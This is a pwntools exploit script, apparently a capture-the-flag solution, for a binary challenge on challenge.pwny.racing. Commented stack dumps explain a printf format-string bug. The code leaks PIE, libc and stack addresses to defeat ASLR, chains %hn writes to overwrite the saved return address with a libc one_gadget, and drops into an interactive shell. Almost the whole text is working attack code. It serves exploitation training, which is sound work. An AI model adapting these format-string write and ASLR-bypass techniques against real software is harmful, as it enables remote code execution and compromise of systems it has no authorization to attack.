#!/usr/bin/python
# -*- coding: utf-8 -*-
from pwn import *
import sys

config = {
	"elf" : "./chall7",
	"libc" : "./libc-2.27.so",
	"HOST" : "challenge.pwny.racing",
	"PORT" : 11531
}

def exploit(r):
	"""
	(Summary)
	Double-stage format string exploit with limited payload size.
	Vulnerable line of code is in `output()`

	```
	_QWORD output(){
		...
		printf(data);
		...
	}
	```

	Where `data` is user-controlled, and *effectively* limited to 13 bytes.
	This limit can be bypassed using a null-byte but it isn't useful for
	this version of the exploit.

	Using a double-stage format string exploit you can write arbitrary values
	in the stack, overwriting the saved RIP and calling your one_gadget
	"""


	#####################################
	# utility functions for convenience #
	#####################################
	f = lambda x : r.sendafter("input: ", x+'\x00')
	def out():
		r.recvuntil("output: ")
		return r.recvuntil("retry", drop=True).rstrip()
	again = lambda : r.sendlineafter("nope): ",  "yes sir")

	################################
	# leak pointers to bypass ASLR #
	################################
	"""
	set a breakpoint at PIE_BASE + 0xAFA (right before the vulnerable `printf` call)
	You can then dump the stack to find any useful pointers that allow you to
	bypass ASLR

	```
	gef➤  deref $sp 50
	0x00007ffca27e85f0│+0x0000: 0x0000000000000000	 ← $rsp						(TOP OF STACK)[6]
			...
	0x00007ffca27e8620│+0x0030: 0x00007ffca27e8660  →  ...						(STACK LEAK)[12]
	0x00007ffca27e8628│+0x0038: 0x0000563188054b7f  →  <play+116> leave 		(PIE LEAK)[13]
			...
	0x00007ffca27e86c8│+0x00d8: 0x00007f1178616dd0  →  <_exit+0> mov edx, edi	(LIBC LEAK)[33]
	```
	"""
	# pie leak
	f("%13$p")
	pie_base = int(out(), 16)-0xb7f
	log.info("pie_base : 0x{:x}".format(pie_base))
	again()
	# libc leak
	f("%33$p")
	libc_base = int(out(), 16)-0xe4dd0
	log.info("libc_base : 0x{:x}".format(libc_base))
	again()
	# stack leak
	f("%12$s")
	stack_cursor = u64(out().ljust(8, '\x00'))
	log.info("stack_cursor : 0x{:x}".format(stack_cursor))
	again()

	############################################################
	# use double-stage format string to achieve arbitary write #
	############################################################
	"""
	breaking at the same place as before (PIE_BASE + 0xAFA), you can dump the stack to find
	a chain of stack pointers.
	i.e. a pointer in the stack that points to the stack address that contains another
	pointer to the stack.
	```
	0x00007ffca27e85f0│+0x0000: 0x0000000000000000	 ← $rsp						(TOP OF STACK)[6]
		...
	0x00007ffca27e8620│+0x0030: 0x00007ffca27e8660  →  0x00007ffca27e86c0  →  0x0000563188054c70  →  <__libc_csu_init+0> push r15	 ← $rbp
		...
	0x00007ffca27e8660│+0x0070: 0x00007ffca27e86c0  →  0x0000563188054c70  →  <__libc_csu_init+0> push r15
		...
	0x00007ffca27e86c0│+0x00d0: 0x0000563188054c70  →  <__libc_csu_init+0> push r15
	```

	Notice that you can use the pointer at +0x0030 to overwrite 1 or 2 of the lower bytes
	of the pointer at 0x0070. Then when you write to the pointer at 0x0070, it will write
	to a slightly different location in the stack. This way you can use the pointer at
	0x0070 as a sort of "cursor", modifying it's lower bytes to "move" the cursor along the
	stack, writing 1 or 2 bytes at a time with full control.
	"""

	# Utility function to write an arbitary address at 0x00d0
	"""
	for example, calling a(0xdeadbeefcafebabe), will result in the following stack
	```
	0x00007ffca27e85f0│+0x0000: 0x0000000000000000	 ← $rsp						(TOP OF STACK)[6]
		...
	0x00007ffca27e86c0│+0x00d0: 0xdeadbeefcafebabe (woot)
	```
	"""
	def a(addr):
		i = 0
		while addr > 0:
			f("%{}c%12$hhn".format((stack_cursor&0xff)+i))
			again()
			f("%{}c%20$hn".format(addr & 0xffff))
			again()
			i += 2
			addr >>= 16

	# Overwrite the saved-RIP of main with a one_gadget
	# Using the earlier primitive `a()` to achieve arbitrary write
	one_gadget = libc_base + 0x4f322
	for i in xrange(4):
		a(stack_cursor+0xc+i*2)
		f("%{}c%32$hn".format(one_gadget & 0xffff))
		again()
		one_gadget >>= 16
	a(stack_cursor+0xc+i*2)
	f("%32$hn".format(one_gadget & 0xffff))

	# Return to main, win
	r.sendlineafter(": ", "nope")
	sleep(0.1)
	r.sendline("echo 'Solved'")

	r.interactive()
	return

if __name__ == "__main__":
	if "elf" in config.keys() and config["elf"]:
		e = ELF(config["elf"])
	
	if "libc" in config.keys() and config["libc"]:
		libc = ELF(config["libc"])

	if sys.argv[-1] == "remote":
		r = remote(config["HOST"], config["PORT"])
		exploit(r)
	else:
		if "libc" in dir():
			r = process(config["elf"], env={"LD_PRELOAD" : config["libc"]})
		else:
			r = process(config["elf"])
		print util.proc.pidof(r)

		if sys.argv[-1] == "debug":
			pause()
		exploit(r)
